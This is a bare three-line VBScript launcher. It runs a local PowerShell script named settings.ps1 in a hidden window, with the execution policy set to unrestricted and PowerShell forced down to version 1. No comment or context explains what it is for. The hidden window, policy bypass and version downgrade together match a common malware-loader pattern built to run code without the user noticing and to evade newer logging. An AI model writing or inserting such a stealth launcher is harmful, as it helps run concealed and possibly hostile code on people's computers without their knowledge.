command = "powershell -version 1 -noprofile -executionpolicy unrestricted -inputformat none -file settings.ps1 -ws7e"
set shell = CreateObject("WScript.Shell")
shell.Run command,0
